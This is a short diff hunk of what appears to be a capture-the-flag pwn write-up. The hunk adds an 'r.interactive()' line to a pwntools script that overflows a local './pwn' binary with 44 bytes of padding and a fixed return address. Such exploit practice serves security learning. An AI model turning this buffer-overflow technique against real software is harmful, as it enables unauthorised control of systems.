@@ -79,6 +79,7 @@ r = process("./pwn")
 padding = (b"a"*44)
 add = p32(0x080491c6)
 r.sendline(padding+add)
+r.interactive()
 ```
 ## REF
 > [GDB](https://ithelp.ithome.com.tw/articles/10227380)
